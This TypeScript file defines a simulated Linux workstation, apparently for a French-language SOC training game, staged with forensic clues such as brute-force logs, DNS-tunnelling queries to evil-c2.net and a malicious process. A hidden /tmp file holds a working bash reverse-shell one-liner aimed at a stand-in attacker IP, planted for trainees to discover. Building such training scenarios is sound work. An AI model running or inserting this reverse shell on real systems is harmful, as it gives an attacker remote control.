// === KRONOS TERMINAL ENGINE ===
// Modular virtual Linux environment with VFS, processes, services, network state

export interface VFSNode {
  type: 'file' | 'dir';
  content?: string;
  children?: Record<string, VFSNode>;
  permissions?: string;
  owner?: string;
  modified?: string;
}

export interface Process {
  pid: number;
  user: string;
  cpu: string;
  mem: string;
  command: string;
  malicious?: boolean;
}

export interface NetworkConnection {
  proto: string;
  localAddr: string;
  foreignAddr: string;
  state: string;
  pid: number;
  suspicious?: boolean;
}

export interface TerminalTab {
  id: string;
  label: string;
  hostname: string;
  cwd: string;
  history: TerminalLine[];
  commandHistory: string[];
  historyPos: number;
}

export interface TerminalLine {
  type: 'prompt' | 'output' | 'error' | 'hint' | 'mentor' | 'system' | 'success';
  text: string;
  timestamp?: string;
}

export interface EngineState {
  hostname: string;
  user: string;
  cwd: string;
  env: Record<string, string>;
  aliases: Record<string, string>;
}

// ── Virtual File System ──
export const createDefaultVFS = (): Record<string, VFSNode> => ({
  '/': {
    type: 'dir',
    children: {
      home: {
        type: 'dir',
        children: {
          kronos: {
            type: 'dir',
            permissions: 'drwxr-xr-x',
            owner: 'kronos',
            children: {
              'auth.log': {
                type: 'file',
                permissions: '-rw-r--r--',
                owner: 'kronos',
                modified: '2026-02-28 10:07',
                content: '10:05 - User: Admin - IP: 192.168.1.5 - Status: FAILED\n10:06 - User: Admin - IP: 45.33.2.1 - Status: FAILED\n10:07 - User: Admin - IP: 45.33.2.1 - Status: SUCCESS',
              },
              'server_dump.txt': {
                type: 'file',
                permissions: '-rw-r--r--',
                owner: 'kronos',
                modified: '2026-02-28 09:15',
                content: 'error at 0x892 memory block. connection from 203.0.113.89 dropped. retry in 5s.\nsegfault in module net_handler at 0x4a2e. stack trace follows.\nWARNING: buffer overflow attempt detected from 198.51.100.42',
              },
              'notes.txt': {
                type: 'file',
                permissions: '-rw-------',
                owner: 'kronos',
                modified: '2026-02-27 18:30',
                content: 'Pense à vérifier les connexions suspectes sur le port 22.\nVérifier les logs DNS pour backup.kronos.local\nSurveiller 185.193.XX.XX — beaconing potentiel',
              },
              '.bashrc': {
                type: 'file',
                permissions: '-rw-r--r--',
                owner: 'kronos',
                content: '# Kronos SOC Workstation\nexport PS1="\\u@\\h:\\w\\$ "\nalias ll="ls -la"\nalias cls="clear"',
              },
              logs: {
                type: 'dir',
                permissions: 'drwxr-xr-x',
                owner: 'kronos',
                children: {
                  'access.log': {
                    type: 'file',
                    permissions: '-rw-r--r--',
                    owner: 'root',
                    modified: '2026-03-01 07:42',
                    content: '192.168.1.10 - - [01/Mar/2026:07:30:12] "GET /admin 403"\n192.168.1.10 - - [01/Mar/2026:07:30:15] "GET /login 200"\n45.33.2.1 - - [01/Mar/2026:07:31:02] "POST /login 401"\n45.33.2.1 - - [01/Mar/2026:07:31:03] "POST /login 401"\n45.33.2.1 - - [01/Mar/2026:07:31:04] "POST /login 401"\n45.33.2.1 - - [01/Mar/2026:07:31:05] "POST /login 200"\n192.168.1.45 - - [01/Mar/2026:07:35:22] "GET /api/users 200"\n185.193.88.42 - - [01/Mar/2026:07:40:01] "POST /api/export 200"',
                  },
                  'error.log': {
                    type: 'file',
                    permissions: '-rw-r--r--',
                    owner: 'root',
                    modified: '2026-03-01 07:40',
                    content: '[error] segfault at 0x0 ip 0x7f3b2a1c3d40 sp 0x7ffc9e2a1b08\n[warn] mod_ssl: SSL handshake failed from 185.193.88.42\n[crit] possible memory corruption in worker pid 2847',
                  },
                  'dns.log': {
                    type: 'file',
                    permissions: '-rw-r--r--',
                    owner: 'root',
                    modified: '2026-03-01 07:41',
                    content: '07:30:01 QUERY A backup.kronos.local -> 192.168.1.12\n07:30:02 QUERY A www.kronos-global.com -> 93.184.216.34\n07:35:15 QUERY TXT aGVsbG8=.data.evil-c2.net -> NXDOMAIN\n07:35:16 QUERY TXT d29ybGQ=.data.evil-c2.net -> NXDOMAIN\n07:35:17 QUERY TXT cGF5bG9hZA==.data.evil-c2.net -> NXDOMAIN\n07:40:01 QUERY A backup.kronos.local -> 192.168.1.99',
                  },
                },
              },
              scripts: {
                type: 'dir',
                permissions: 'drwxr-xr-x',
                owner: 'kronos',
                children: {
                  'scan_ips.py': {
                    type: 'file',
                    permissions: '-rwxr-xr-x',
                    owner: 'kronos',
                    content: '#!/usr/bin/env python3\nimport socket\nimport sys\n\ntargets = ["192.168.1.1", "192.168.1.12", "192.168.1.45", "10.0.5.50"]\nfor ip in targets:\n    try:\n        socket.setdefaulttimeout(1)\n        s = socket.socket()\n        s.connect((ip, 22))\n        print(f"[+] {ip}:22 OPEN")\n        s.close()\n    except:\n        print(f"[-] {ip}:22 CLOSED")',
                  },
                  'log_parser.py': {
                    type: 'file',
                    permissions: '-rwxr-xr-x',
                    owner: 'kronos',
                    content: '#!/usr/bin/env python3\nfrom collections import Counter\n\nwith open("/home/kronos/logs/access.log") as f:\n    ips = [line.split()[0] for line in f]\n\nfor ip, count in Counter(ips).most_common():\n    if count > 3:\n        print(f"[ALERT] Suspicious IP: {ip} — {count} requests")',
                  },
                },
              },
            },
          },
        },
      },
      etc: {
        type: 'dir',
        children: {
          'resolv.conf': {
            type: 'file',
            permissions: '-rw-r--r--',
            owner: 'root',
            modified: '2026-03-01 02:13',
            content: '# Modified 02:13 — source unknown\nnameserver 192.168.1.99\nnameserver 8.8.8.8',
          },
          'hosts': {
            type: 'file',
            permissions: '-rw-r--r--',
            owner: 'root',
            content: '127.0.0.1 localhost\n192.168.1.1 gateway.kronos.local\n192.168.1.12 backup.kronos.local\n192.168.1.50 soc-workstation',
          },
          'passwd': {
            type: 'file',
            permissions: '-rw-r--r--',
            owner: 'root',
            content: 'root:x:0:0:root:/root:/bin/bash\nkronos:x:1000:1000:Kronos Analyst:/home/kronos:/bin/bash\nbackup:x:1001:1001:Backup Service:/var/backup:/usr/sbin/nologin',
          },
          'shadow': {
            type: 'file',
            permissions: '-rw-------',
            owner: 'root',
            content: '',
          },
        },
      },
      var: {
        type: 'dir',
        children: {
          log: {
            type: 'dir',
            children: {
              'auth.log': {
                type: 'file',
                permissions: '-rw-r-----',
                owner: 'root',
                modified: '2026-03-01 02:13',
                content: 'Feb 28 23:55:01 soc-workstation sshd[4521]: Failed password for root from 198.51.100.42 port 44231\nFeb 28 23:55:03 soc-workstation sshd[4521]: Failed password for root from 198.51.100.42 port 44231\nFeb 28 23:55:05 soc-workstation sshd[4521]: Failed password for root from 198.51.100.42 port 44231\nMar  1 02:13:01 backup-server sshd[8832]: Accepted password for backup from 192.168.1.45 port 52201\nMar  1 02:13:45 backup-server usermod[8901]: account backup: unlocked',
              },
              'syslog': {
                type: 'file',
                permissions: '-rw-r-----',
                owner: 'root',
                modified: '2026-03-01 07:42',
                content: 'Mar  1 07:30:00 soc-workstation systemd[1]: Started Daily apt download.\nMar  1 07:42:01 soc-workstation kernel: [UFW BLOCK] IN=eth0 SRC=185.193.88.42 DST=192.168.1.50 PROTO=TCP DPT=4444\nMar  1 07:42:15 backup-server kernel: tcp_probe: src=192.168.1.12:49822 dst=185.193.88.42:443 mark=0',
              },
              'firewall.log': {
                type: 'file',
                permissions: '-rw-r-----',
                owner: 'root',
                modified: '2026-03-01 07:42',
                content: '07:30:01 ALLOW TCP 192.168.1.10:55201 -> 192.168.1.50:443\n07:31:02 ALLOW TCP 45.33.2.1:41023 -> 192.168.1.50:80\n07:35:22 ALLOW TCP 192.168.1.45:52201 -> 192.168.1.12:22\n07:40:01 ALLOW TCP 192.168.1.12:49822 -> 185.193.88.42:443\n07:42:01 BLOCK TCP 185.193.88.42:8080 -> 192.168.1.50:4444',
              },
            },
          },
        },
      },
      root: {
        type: 'dir',
        permissions: 'drwx------',
        owner: 'root',
        children: {},
      },
      tmp: {
        type: 'dir',
        permissions: 'drwxrwxrwt',
        owner: 'root',
        children: {
          '.hidden_shell': {
            type: 'file',
            permissions: '-rwxr-xr-x',
            owner: 'root',
            content: '#!/bin/bash\n# Reverse shell payload — MALICIOUS\nbash -i >& /dev/tcp/185.193.88.42/4444 0>&1',
          },
        },
      },
    },
  },
});

// ── Default Processes ──
export const DEFAULT_PROCESSES: Process[] = [
  { pid: 1, user: 'root', cpu: '0.0', mem: '0.4', command: 'systemd' },
  { pid: 245, user: 'root', cpu: '0.1', mem: '1.2', command: '/usr/sbin/sshd -D' },
  { pid: 312, user: 'root', cpu: '0.0', mem: '0.8', command: '/usr/sbin/rsyslogd' },
  { pid: 578, user: 'kronos', cpu: '0.3', mem: '2.1', command: '/usr/bin/bash' },
  { pid: 1024, user: 'root', cpu: '0.1', mem: '1.5', command: '/usr/sbin/named' },
  { pid: 1337, user: 'root', cpu: '2.8', mem: '3.4', command: '/usr/bin/system-update', malicious: true },
  { pid: 2847, user: 'www-data', cpu: '0.5', mem: '4.2', command: '/usr/sbin/apache2 -k start' },
  { pid: 3201, user: 'kronos', cpu: '0.2', mem: '1.8', command: 'python3 /home/kronos/scripts/monitor.py' },
];

// ── Default Network Connections ──
export const DEFAULT_CONNECTIONS: NetworkConnection[] = [
  { proto: 'tcp', localAddr: '192.168.1.50:22', foreignAddr: '0.0.0.0:*', state: 'LISTEN', pid: 245 },
  { proto: 'tcp', localAddr: '192.168.1.50:80', foreignAddr: '0.0.0.0:*', state: 'LISTEN', pid: 2847 },
  { proto: 'tcp', localAddr: '192.168.1.50:443', foreignAddr: '0.0.0.0:*', state: 'LISTEN', pid: 2847 },
  { proto: 'tcp', localAddr: '192.168.1.12:49822', foreignAddr: '185.193.88.42:443', state: 'ESTABLISHED', pid: 1337, suspicious: true },
  { proto: 'tcp', localAddr: '192.168.1.50:55201', foreignAddr: '192.168.1.10:443', state: 'ESTABLISHED', pid: 578 },
  { proto: 'udp', localAddr: '192.168.1.50:53', foreignAddr: '0.0.0.0:*', state: '', pid: 1024 },
];

// ── Default Aliases ──
export const DEFAULT_ALIASES: Record<string, string> = {
  'll': 'ls -la',
  'cls': 'clear',
  'la': 'ls -a',
  'ports': 'netstat -tunap',
  'connections': 'netstat -an',
  'procs': 'ps aux',
};

// ── DNS Resolver ──
export const DNS_RECORDS: Record<string, string> = {
  'backup.kronos.local': '192.168.1.12',
  'gateway.kronos.local': '192.168.1.1',
  'soc-workstation': '192.168.1.50',
  'www.kronos-global.com': '93.184.216.34',
  'google.com': '142.250.80.46',
  'evil-c2.net': '185.193.88.42',
};

// ── ARP Table ──
export const ARP_TABLE: { ip: string; mac: string; iface: string }[] = [
  { ip: '192.168.1.1', mac: 'aa:bb:cc:dd:ee:01', iface: 'eth0' },
  { ip: '192.168.1.10', mac: 'aa:bb:cc:dd:ee:10', iface: 'eth0' },
  { ip: '192.168.1.12', mac: 'aa:bb:cc:dd:ee:12', iface: 'eth0' },
  { ip: '192.168.1.45', mac: 'aa:bb:cc:dd:ee:45', iface: 'eth0' },
  { ip: '192.168.1.50', mac: 'aa:bb:cc:dd:ee:50', iface: 'eth0' },
];

// ── Resolve VFS Path ──
export function resolveVFSPath(vfs: Record<string, VFSNode>, cwd: string, target: string): VFSNode | null {
  const abs = target.startsWith('/') ? target : `${cwd}/${target}`.replace(/\/+/g, '/');
  const parts = abs.split('/').filter(Boolean);
  
  let node = vfs['/'];
  for (const part of parts) {
    if (part === '..') continue; // simplified
    if (part === '.') continue;
    if (node.type !== 'dir' || !node.children?.[part]) return null;
    node = node.children[part];
  }
  return node;
}

// ── Format ls output ──
export function formatLs(node: VFSNode, long: boolean, showHidden: boolean): string {
  if (node.type !== 'dir' || !node.children) return '';
  
  const entries = Object.entries(node.children)
    .filter(([name]) => showHidden || !name.startsWith('.'));

  if (!long) {
    return entries.map(([name, n]) => n.type === 'dir' ? `\x1b[34m${name}/\x1b[0m` : name).join('  ');
  }

  return entries.map(([name, n]) => {
    const perms = n.permissions || (n.type === 'dir' ? 'drwxr-xr-x' : '-rw-r--r--');
    const owner = n.owner || 'kronos';
    const mod = n.modified || '2026-03-01 00:00';
    const size = n.type === 'file' ? (n.content?.length || 0).toString() : '4096';
    const displayName = n.type === 'dir' ? `\x1b[34m${name}/\x1b[0m` : name;
    return `${perms} ${owner.padEnd(8)} ${size.padStart(6)} ${mod} ${displayName}`;
  }).join('\n');
}

// ── Supported commands for autocompletion ──
export const ALL_COMMANDS = [
  'ls', 'cd', 'cat', 'pwd', 'grep', 'ping', 'clear', 'help', 'man',
  'whoami', 'iptables', 'nslookup', 'netstat', 'ps', 'top', 'kill',
  'chmod', 'chown', 'find', 'head', 'tail', 'wc', 'echo', 'date',
  'hostname', 'uname', 'uptime', 'id', 'history', 'alias', 'unalias',
  'arp', 'traceroute', 'tcpdump', 'nmap', 'curl', 'wget', 'ssh',
  'systemctl', 'service', 'ip', 'ifconfig', 'lsof', 'crontab',
  'file', 'strings', 'base64', 'md5sum', 'sha256sum', 'diff',
  'telnet', 'whois', 'dig', 'export', 'env', 'python3',
];

export const MAN_PAGES: Record<string, string> = {
  ls: 'Usage: ls [-la] [dossier]\n  Liste le contenu du répertoire courant ou spécifié.\n  -l  Format long\n  -a  Afficher les fichiers cachés',
  cd: 'Usage: cd [dossier]\n  Change le répertoire courant.',
  cat: "Usage: cat [fichier]\n  Affiche le contenu d'un fichier texte.",
  pwd: 'Usage: pwd\n  Affiche le chemin du répertoire courant.',
  grep: "Usage: grep [-i] [MOT_CLE] [FICHIER]\n  Filtre les lignes contenant le mot-clé.\n  -i  Ignorer la casse",
  ping: "Usage: ping [IP/domaine]\n  Envoie des paquets ICMP pour tester la connectivité.",
  traceroute: "Usage: traceroute [IP/domaine]\n  Affiche la route des paquets vers la destination.",
  clear: "Usage: clear\n  Efface l'écran du terminal.",
  help: 'Usage: help\n  Affiche la liste des commandes disponibles.',
  man: "Usage: man [commande]\n  Affiche le manuel d'une commande.",
  iptables: "Usage: iptables -A INPUT -s [IP] -j DROP\n  Ajoute une règle de pare-feu pour bloquer le trafic entrant.",
  nslookup: "Usage: nslookup [domaine]\n  Résout un nom de domaine en adresse IP.",
  netstat: 'Usage: netstat [-tunap] [-an]\n  Affiche les connexions réseau actives.',
  whoami: "Usage: whoami\n  Affiche l'utilisateur courant.",
  ps: 'Usage: ps [aux]\n  Affiche les processus en cours.',
  arp: "Usage: arp [-a]\n  Affiche la table ARP.",
  tcpdump: "Usage: tcpdump [-i eth0] [host IP] [port N]\n  Capture le trafic réseau.",
  nmap: "Usage: nmap [-sV] [IP/réseau]\n  Scanner de ports et services.",
  kill: "Usage: kill [-9] [PID]\n  Termine un processus.",
  chmod: "Usage: chmod [permissions] [fichier]\n  Modifie les permissions d'un fichier.",
  ip: "Usage: ip [a|r|link]\n  Affiche la configuration réseau.",
  systemctl: "Usage: systemctl [start|stop|status] [service]\n  Gère les services système.",
  lsof: "Usage: lsof [-i] [:port]\n  Liste les fichiers ouverts / connexions.",
  crontab: "Usage: crontab [-l|-e]\n  Affiche ou édite les tâches planifiées.",
  find: "Usage: find [chemin] [-name pattern]\n  Recherche des fichiers.",
  tail: "Usage: tail [-n N] [-f] [fichier]\n  Affiche les dernières lignes d'un fichier.",
  head: "Usage: head [-n N] [fichier]\n  Affiche les premières lignes d'un fichier.",
  base64: "Usage: base64 [-d] [fichier]\n  Encode/décode en Base64.",
  sha256sum: "Usage: sha256sum [fichier]\n  Calcule l'empreinte SHA-256.",
  strings: "Usage: strings [fichier]\n  Extrait les chaînes ASCII d'un binaire.",
  ssh: "Usage: ssh [user@host]\n  Connexion SSH distante.",
  curl: "Usage: curl [-v] [URL]\n  Transfère des données depuis une URL.",
};
